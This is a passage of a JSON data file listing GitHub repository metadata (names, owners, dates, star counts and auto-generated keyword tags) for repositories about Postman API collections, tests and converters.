    "id": 90684158,
    "name": "postman",
    "full_name": "joyasams/postman",
    "description": null,
    "fork": false,
    "created_at": "2017-05-09T00:19:21Z",
    "updated_at": "2018-09-21T19:25:56Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 17188117,
    "owner_login": "joyasams",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/17188117?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 92412475,
    "name": "Postman",
    "full_name": "ugopag/Postman",
    "description": null,
    "fork": false,
    "created_at": "2017-05-25T14:38:07Z",
    "updated_at": "2017-05-25T14:38:07Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 28952838,
    "owner_login": "ugopag",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/28952838?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 85280702,
    "name": "Postman",
    "full_name": "paisley1991/Postman",
    "description": null,
    "fork": false,
    "created_at": "2017-03-17T06:57:09Z",
    "updated_at": "2017-03-17T06:57:09Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 20550499,
    "owner_login": "paisley1991",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/20550499?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 157857158,
    "name": "random-phone-number-generator",
    "full_name": "benfluleck/random-phone-number-generator",
    "description": "Random number generator is a full stack javascript app that implements a simple way to generate phone numbers in a file in an order specified",
    "fork": false,
    "created_at": "2018-11-16T11:17:23Z",
    "updated_at": "2019-04-27T20:01:46Z",
    "stargazers_count": 4,
    "watchers_count": 4,
    "forks": 2,
    "watchers": 4,
    "score": 1,
    "owner_id": 26222856,
    "owner_login": "benfluleck",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/26222856?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "script",
      "implement",
      "generate",
      "spec",
      "full",
      "java",
      "generator",
      "stack",
      "order",
      "javascript",
      "full stack",
      "implements"
    ]
  },
  {
    "id": 196286329,
    "name": "PostmanRestfulAPI",
    "full_name": "maiya-tracy/PostmanRestfulAPI",
    "description": null,
    "fork": false,
    "created_at": "2019-07-10T23:11:17Z",
    "updated_at": "2019-07-10T23:11:49Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 50335747,
    "owner_login": "maiya-tracy",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/50335747?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 188245041,
    "name": "common-api-tests_js",
    "full_name": "digipolisantwerp/common-api-tests_js",
    "description": "Bundled of the most commonly used Postman test scripts in one JavaScript file.",
    "fork": false,
    "created_at": "2019-05-23T13:58:58Z",
    "updated_at": "2020-03-16T13:04:27Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 2,
    "watchers": 0,
    "score": 1,
    "owner_id": 16398335,
    "owner_login": "digipolisantwerp",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/16398335?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "file",
      "script",
      "scripts",
      "common"
    ]
  },
  {
    "id": 97910926,
    "name": "grunt-postman-variables",
    "full_name": "guvkon/grunt-postman-variables",
    "description": "Replace Postman variables in JS files from globals.postman_globals",
    "fork": false,
    "created_at": "2017-07-21T05:53:01Z",
    "updated_at": "2017-07-24T04:30:37Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 2995141,
    "owner_login": "guvkon",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/2995141?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "files",
      "place",
      "variable",
      "variables"
    ]
  },
  {
    "id": 198230667,
    "name": "PostmanPat123.github.io",
    "full_name": "PostmanPat123/PostmanPat123.github.io",
    "description": null,
    "fork": false,
    "created_at": "2019-07-22T13:38:38Z",
    "updated_at": "2019-07-22T13:54:10Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 42339292,
    "owner_login": "PostmanPat123",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/42339292?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 235002186,
    "name": "postman-collection-generators",
    "full_name": "raw34/postman-collection-generators",
    "description": "Generate postman collection from files, like postman, openapi, swagger, charles...",
    "fork": false,
    "created_at": "2020-01-20T02:20:40Z",
    "updated_at": "2020-02-04T02:14:13Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 1996768,
    "owner_login": "raw34",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/1996768?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "postman collection",
      "file",
      "files",
      "swagger",
      "open",
      "charles",
      "openapi"
    ]
  },
  {
    "id": 55687770,
    "name": "UploadOfXMLServerUsingPostman",
    "full_name": "surendragurram/UploadOfXMLServerUsingPostman",
    "description": "upload files using postman ",
    "fork": false,
    "created_at": "2016-04-07T11:02:22Z",
    "updated_at": "2016-04-07T11:02:34Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 7326866,
    "owner_login": "surendragurram",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/7326866?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "file",
      "files",
      "load",
      "upload"
    ]
  },
  {
    "id": 214703433,
    "name": "supertest-postman",
    "full_name": "AndrewKeig/supertest-postman",
    "description": "This project will take a postman collection v2 file and generate supertest tests.",
    "fork": false,
    "created_at": "2019-10-12T19:27:49Z",
    "updated_at": "2020-02-22T22:00:08Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 1,
    "watchers": 1,
    "score": 1,
    "owner_id": 62837,
    "owner_login": "AndrewKeig",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/62837?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "collect",
      "collection",
      "postman collection",
      "file",
      "tests",
      "generate",
      "super",
      "supertest"
    ]
  },
  {
    "id": 120773400,
    "name": "apidoc-postman",
    "full_name": "peerapongsam/apidoc-postman",
    "description": "plugin for generate postman collection file",
    "fork": false,
    "created_at": "2018-02-08T14:40:39Z",
    "updated_at": "2018-02-08T14:58:25Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 5426486,
    "owner_login": "peerapongsam",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/5426486?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "postman collection",
      "file",
      "generate",
      "plugin"
    ]
  },
  {
    "id": 188443416,
    "name": "api_postman",
    "full_name": "seephp/api_postman",
    "description": null,
    "fork": false,
    "created_at": "2019-05-24T15:13:11Z",
    "updated_at": "2019-05-26T15:55:44Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 22181772,
    "owner_login": "seephp",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/22181772?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 241329779,
    "name": "Postman-Documentor",
    "full_name": "prab409069/Postman-Documentor",
    "description": null,
    "fork": false,
    "created_at": "2020-02-18T10:11:15Z",
    "updated_at": "2020-02-20T01:11:00Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 14146201,
    "owner_login": "prab409069",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/14146201?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 193368246,
    "name": "Postman-Infor_Nexus",
    "full_name": "Arnaud80/Postman-Infor_Nexus",
    "description": "Postman files for Infor Nexus",
    "fork": false,
    "created_at": "2019-06-23T16:01:57Z",
    "updated_at": "2019-06-23T16:12:31Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 844975,
    "owner_login": "Arnaud80",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/844975?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "files"
    ]
  },
  {
    "id": 201135695,
    "name": "postman-read-file",
    "full_name": "matt-ball/postman-read-file",
    "description": "Read a local data file on a per request level.",
    "fork": false,
    "created_at": "2019-08-07T22:18:45Z",
    "updated_at": "2019-08-09T01:00:20Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 8490181,
    "owner_login": "matt-ball",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/8490181?v=4",
    "pulled": 1,
    "tags": [
      "data",
      "request",
      "file",
      "local",
      "level"
    ]
  },
  {
    "id": 162580169,
    "name": "postman-demo-api",
    "full_name": "flightcom/postman-demo-api",
    "description": null,
    "fork": false,
    "created_at": "2018-12-20T13:00:29Z",
    "updated_at": "2018-12-20T13:03:44Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 4329156,
    "owner_login": "flightcom",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/4329156?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 195262908,
    "name": "postman-doc-generator",
    "full_name": "vishweswaran-p/postman-doc-generator",
    "description": "This package is used to create an xlsx file from the postman collection.",
    "fork": false,
    "created_at": "2019-07-04T15:09:25Z",
    "updated_at": "2019-07-04T15:13:53Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 50708520,
    "owner_login": "vishweswaran-p",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/50708520?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "create",
      "postman collection",
      "file",
      "package",
      "xlsx"
    ]
  },
  {
    "id": 245610006,
    "name": "postman-document-generator",
    "full_name": "crisplaver/postman-document-generator",
    "description": "generate postman html page using collection v2.1 json file",
    "fork": false,
    "created_at": "2020-03-07T10:12:48Z",
    "updated_at": "2020-03-07T10:16:32Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 21243484,
    "owner_login": "crisplaver",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/21243484?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "file",
      "json",
      "generate",
      "html"
    ]
  },
  {
    "id": 38361236,
    "name": "api-blueprint-to-postman",
    "full_name": "call-a3/api-blueprint-to-postman",
    "description": "Converts Blueprint files to postman collections",
    "fork": false,
    "created_at": "2015-07-01T09:08:59Z",
    "updated_at": "2015-07-01T09:31:23Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 6589800,
    "owner_login": "call-a3",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/6589800?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "collections",
      "postman collection",
      "file",
      "files",
      "postman collections",
      "print"
    ]
  },
  {
    "id": 62243335,
    "name": "postman-collection-prefixer",
    "full_name": "cebor/postman-collection-prefixer",
    "description": null,
    "fork": false,
    "created_at": "2016-06-29T17:05:44Z",
    "updated_at": "2016-06-29T17:06:02Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 1576120,
    "owner_login": "cebor",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/1576120?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 69291165,
    "name": "postman-boyan-checker",
    "full_name": "pepyakin/postman-boyan-checker",
    "description": null,
    "fork": false,
    "created_at": "2016-09-26T20:44:14Z",
    "updated_at": "2016-09-26T21:42:26Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 2205845,
    "owner_login": "pepyakin",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/2205845?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 133830456,
    "name": "postman-react-redux",
    "full_name": "CrystalCodes01/postman-react-redux",
    "description": null,
    "fork": false,
    "created_at": "2018-05-17T15:07:10Z",
    "updated_at": "2018-05-22T18:27:40Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 23488854,
    "owner_login": "CrystalCodes01",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/23488854?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 149137934,
    "name": "auth0-postman-express",
    "full_name": "lukeocodes/auth0-postman-express",
    "description": null,
    "fork": false,
    "created_at": "2018-09-17T14:27:21Z",
    "updated_at": "2018-11-22T12:40:31Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 956290,
    "owner_login": "lukeocodes",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/956290?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 191284656,
    "name": "slot_postman_server",
    "full_name": "klayhung/slot_postman_server",
    "description": null,
    "fork": false,
    "created_at": "2019-06-11T03:10:36Z",
    "updated_at": "2019-06-12T16:49:52Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 32105327,
    "owner_login": "klayhung",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/32105327?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 196133241,
    "name": "postman-custom-loops",
    "full_name": "jerowang/postman-custom-loops",
    "description": null,
    "fork": false,
    "created_at": "2019-07-10T04:49:11Z",
    "updated_at": "2019-07-10T21:25:51Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 16468982,
    "owner_login": "jerowang",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/16468982?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 182004440,
    "name": "Backend-mongoDB-postman",
    "full_name": "kevinsbstn4/Backend-mongoDB-postman",
    "description": null,
    "fork": false,
    "created_at": "2019-04-18T02:46:53Z",
    "updated_at": "2019-04-18T02:51:01Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 45621026,
    "owner_login": "kevinsbstn4",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/45621026?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 184435320,
    "name": "postman-global-scripts",
    "full_name": "sureshnath/postman-global-scripts",
    "description": null,
    "fork": false,
    "created_at": "2019-05-01T15:14:33Z",
    "updated_at": "2019-05-06T23:04:03Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 2330843,
    "owner_login": "sureshnath",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/2330843?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 206417877,
    "name": "nodejs-upload-file",
    "full_name": "salesh/nodejs-upload-file",
    "description": "Postman upload file txt/pdf test",
    "fork": false,
    "created_at": "2019-09-04T21:30:58Z",
    "updated_at": "2020-02-09T19:46:55Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 3098030,
    "owner_login": "salesh",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/3098030?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "file",
      "load",
      "upload"
    ]
  },
  {
    "id": 149392657,
    "name": "MongoDB-NodeJS-Postman",
    "full_name": "rahul-tiwari-95/MongoDB-NodeJS-Postman",
    "description": null,
    "fork": false,
    "created_at": "2018-09-19T04:32:41Z",
    "updated_at": "2018-09-19T04:33:12Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 42743946,
    "owner_login": "rahul-tiwari-95",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/42743946?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 155572624,
    "name": "js-postman-newman-csv-writer",
    "full_name": "CarlosEduardoFerreiraRamos/js-postman-newman-csv-writer",
    "description": "A javascript csv file writer, receving data from the newman api based on a postman collection",
    "fork": false,
    "created_at": "2018-10-31T14:38:10Z",
    "updated_at": "2018-10-31T14:54:48Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 25060586,
    "owner_login": "CarlosEduardoFerreiraRamos",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/25060586?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "data",
      "postman collection",
      "file",
      "script",
      "based",
      "newman",
      "java",
      "javascript",
      "write",
      "writer"
    ]
  },
  {
    "id": 250093637,
    "name": "PTOE-Postman-Collection-To-Excel-CLI",
    "full_name": "whyDontI/PTOE-Postman-Collection-To-Excel-CLI",
    "description": "A CLI to convert Postman Collection Json file to Excel",
    "fork": false,
    "created_at": "2020-03-25T21:19:19Z",
    "updated_at": "2020-03-25T21:27:10Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26569942,
    "owner_login": "whyDontI",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/26569942?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "convert"
    ]
  },
  {
    "id": 142470568,
    "name": "postman-collections",
    "full_name": "SabreDevStudio/postman-collections",
    "description": "Postman files demonstrating how to call and use APIs found in the Sabre Dev Studio portfolio.",
    "fork": false,
    "created_at": "2018-07-26T17:06:21Z",
    "updated_at": "2019-12-21T07:59:40Z",
    "stargazers_count": 18,
    "watchers_count": 18,
    "forks": 15,
    "watchers": 18,
    "score": 1,
    "owner_id": 7505564,
    "owner_login": "SabreDevStudio",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/7505564?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "call",
      "files",
      "demo",
      "rating",
      "demonstrating",
      "found",
      "folio"
    ]
  },
  {
    "id": 51452858,
    "name": "aws-apigateway-exporter",
    "full_name": "yuun/aws-apigateway-exporter",
    "description": "Python script for exporting an API Gateway stage to a swagger file, in yaml or json format, with Postman or API Gateway integrations extensions.",
    "fork": false,
    "created_at": "2016-02-10T16:13:45Z",
    "updated_at": "2019-02-28T09:15:33Z",
    "stargazers_count": 8,
    "watchers_count": 8,
    "forks": 1,
    "watchers": 8,
    "score": 1,
    "owner_id": 1932872,
    "owner_login": "yuun",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/1932872?v=4",
    "pulled": 1,
    "tags": [
      "form",
      "file",
      "script",
      "json",
      "format",
      "integration",
      "export",
      "swagger",
      "extension",
      "yaml",
      "exporting"
    ]
  },
  {
    "id": 232994616,
    "name": "PostmanCollection_AutomationAPI",
    "full_name": "skylauriam/PostmanCollection_AutomationAPI",
    "description": "This repository has been created to collect all file related to postman collection in CI",
    "fork": false,
    "created_at": "2020-01-10T07:51:33Z",
    "updated_at": "2020-03-04T12:32:38Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 54891224,
    "owner_login": "skylauriam",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/54891224?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "create",
      "repo",
      "postman collection",
      "file",
      "repos",
      "repository",
      "been",
      "related"
    ]
  },
  {
    "id": 207528819,
    "name": "APIDataDriverTestingWithPostman",
    "full_name": "raghwendra-sonu/APIDataDriverTestingWithPostman",
    "description": "https://medium.com/@Raghwendra.sonu/data-driven-testing-with-postman-using-csv-and-json-files-c4f112015eb3?source=friends_link&sk=d0e70700ef7d717ecb4c86dded9552ef",
    "fork": false,
    "created_at": "2019-09-10T10:21:39Z",
    "updated_at": "2019-11-14T03:48:14Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 7844894,
    "owner_login": "raghwendra-sonu",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/7844894?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "data",
      "testing",
      "file",
      "json",
      "http",
      "files",
      "https",
      "source",
      "link",
      "drive",
      "driven",
      "friend"
    ]
  },
  {
    "id": 192517859,
    "name": "RatesExchangeApi-Postman",
    "full_name": "voutsasva/RatesExchangeApi-Postman",
    "description": "Postman collection and enviroment files concerning Rates Exchange API.",
    "fork": false,
    "created_at": "2019-06-18T10:25:40Z",
    "updated_at": "2019-06-19T12:50:37Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 16755826,
    "owner_login": "voutsasva",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/16755826?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "file",
      "files",
      "enviroment",
      "concerning"
    ]
  },
  {
    "id": 228067493,
    "name": "api_automation_with_postman",
    "full_name": "bairagimuduli/api_automation_with_postman",
    "description": null,
    "fork": false,
    "created_at": "2019-12-14T18:10:14Z",
    "updated_at": "2019-12-16T16:27:49Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 21003017,
    "owner_login": "bairagimuduli",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/21003017?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 86764255,
    "name": "surveys-api-service-postman",
    "full_name": "tnguyen01/surveys-api-service-postman",
    "description": null,
    "fork": false,
    "created_at": "2017-03-31T01:15:45Z",
    "updated_at": "2020-03-23T12:56:59Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 2348997,
    "owner_login": "tnguyen01",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/2348997?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 53487149,
    "name": "apigee-baas-postman",
    "full_name": "Carmot/apigee-baas-postman",
    "description": "Postman files with Apigee BaaS API calls examples.",
    "fork": false,
    "created_at": "2016-03-09T09:56:15Z",
    "updated_at": "2016-03-09T09:56:15Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 11278017,
    "owner_login": "Carmot",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/11278017?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "call",
      "example",
      "files",
      "calls",
      "examples"
    ]
  },
  {
    "id": 188684026,
    "name": "CoreApiRegressionTests",
    "full_name": "yaeldonner/CoreApiRegressionTests",
    "description": "Core API Regression Tests- postman files ",
    "fork": false,
    "created_at": "2019-05-26T13:05:15Z",
    "updated_at": "2019-09-22T15:13:12Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 48644909,
    "owner_login": "yaeldonner",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/48644909?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "file",
      "files"
    ]
  },
  {
    "id": 147771785,
    "name": "postman-docx-generator",
    "full_name": "Soontao/postman-docx-generator",
    "description": "Generate word document from postman collection JSON file",
    "fork": false,
    "created_at": "2018-09-07T04:47:13Z",
    "updated_at": "2018-09-14T06:18:40Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 10473459,
    "owner_login": "Soontao",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/10473459?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "postman collection",
      "file",
      "document"
    ]
  },
  {
    "id": 159636679,
    "name": "postmanapitest",
    "full_name": "vikrantmulani/postmanapitest",
    "description": "This is a very basic Postman API of json server test with a collection and environment file.",
    "fork": false,
    "created_at": "2018-11-29T08:58:20Z",
    "updated_at": "2018-11-29T09:27:01Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 29890738,
    "owner_login": "vikrantmulani",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/29890738?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "collect",
      "collection",
      "file",
      "server",
      "json",
      "environment",
      "very",
      "json server"
    ]
  },
  {
    "id": 105566425,
    "name": "postman-soatest",
    "full_name": "parasoft/postman-soatest",
    "description": "Parses the Postman v2 collection.json file and uses the Parasoft SOAtest REST API to create SOAtest .tst's.",
    "fork": false,
    "created_at": "2017-10-02T17:57:40Z",
    "updated_at": "2017-10-02T17:58:47Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 18577356,
    "owner_login": "parasoft",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/18577356?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "collect",
      "collection",
      "create",
      "file",
      "json",
      "uses"
    ]
  },
  {
    "id": 245518277,
    "name": "exchange-aep-profile-integration-postman",
    "full_name": "Adobe-Marketing-Cloud/exchange-aep-profile-integration-postman",
    "description": "A postman collection to assist Exchange partners to build an integration with AEP Profiles",
    "fork": false,
    "created_at": "2020-03-06T21:17:07Z",
    "updated_at": "2020-03-12T18:45:39Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 1440554,
    "owner_login": "Adobe-Marketing-Cloud",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/1440554?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "postman collection",
      "file",
      "files",
      "build",
      "integration",
      "partner",
      "assist"
    ]
  },
  {
    "id": 45615492,
    "name": "inspector2postman",
    "full_name": "stereg/inspector2postman",
    "description": "Script for taking ACI inspector output and converting it into a Google Postman Collection file that can be imported",
    "fork": false,
    "created_at": "2015-11-05T14:15:47Z",
    "updated_at": "2017-05-11T11:11:26Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 4119094,
    "owner_login": "stereg",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/4119094?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "convert",
      "spec",
      "import",
      "converting",
      "imported",
      "output",
      "taking"
    ]
  },
  {
    "id": 238942585,
    "name": "postman-newman-gitlab",
    "full_name": "shcarroll/postman-newman-gitlab",
    "description": "Example repo containing Postman collections of API tests, Newman command line runner for these and a Gitlab CI file",
    "fork": false,
    "created_at": "2020-02-07T14:23:23Z",
    "updated_at": "2020-02-10T09:59:16Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 47427411,
    "owner_login": "shcarroll",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/47427411?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "collect",
      "collection",
      "collections",
      "repo",
      "file",
      "tests",
      "contain",
      "line",
      "runner",
      "command",
      "command line",
      "containing"
    ]
  },
  {
    "id": 192339510,
    "name": "postman_collection",
    "full_name": "happymonktests/postman_collection",
    "description": "postman_collection_and_all_config_files",
    "fork": false,
    "created_at": "2019-06-17T12:07:21Z",
    "updated_at": "2019-06-17T13:18:22Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 13806580,
    "owner_login": "happymonktests",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/13806580?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "file",
      "files",
      "config"
    ]
  },
  {
    "id": 194862659,
    "name": "postman-collections",
    "full_name": "andreiAndrade/postman-collections",
    "description": null,
    "fork": false,
    "created_at": "2019-07-02T12:53:18Z",
    "updated_at": "2019-07-02T12:53:18Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 13753243,
    "owner_login": "andreiAndrade",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/13753243?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 151634088,
    "name": "Postman-Collections",
    "full_name": "Sa-Su/Postman-Collections",
    "description": null,
    "fork": false,
    "created_at": "2018-10-04T20:49:24Z",
    "updated_at": "2018-10-04T21:00:23Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 34747535,
    "owner_login": "Sa-Su",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/34747535?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 223312079,
    "name": "POSTMAN_COLLECTION",
    "full_name": "innodaria/POSTMAN_COLLECTION",
    "description": null,
    "fork": false,
    "created_at": "2019-11-22T03:01:23Z",
    "updated_at": "2019-11-22T03:08:32Z",
    "stargazers_count": 0,
